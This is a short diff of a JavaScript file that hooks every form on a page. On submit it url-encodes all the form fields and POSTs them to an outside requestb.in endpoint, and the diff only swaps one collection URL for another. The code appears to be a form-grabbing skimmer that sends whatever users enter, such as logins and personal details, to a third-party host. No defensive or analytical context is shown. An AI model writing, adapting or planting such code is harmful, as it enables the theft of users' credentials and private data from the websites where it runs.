@@ -4,7 +4,7 @@ var forms = document.forms;
 //called when a submit event happens
 function formSubmit(event) {
     var xhr = new XMLHttpRequest();
-    xhr.open('POST', 'https://requestb.in/pemce6pe');
+    xhr.open('POST', 'https://requestb.in/1c4arlp1');
     var string = '';
     // iterate over all of the form fields and urlencode them. There'll be an extra & at the end but who cares
     for (index = 0; index < event.target.elements.length; ++index) {
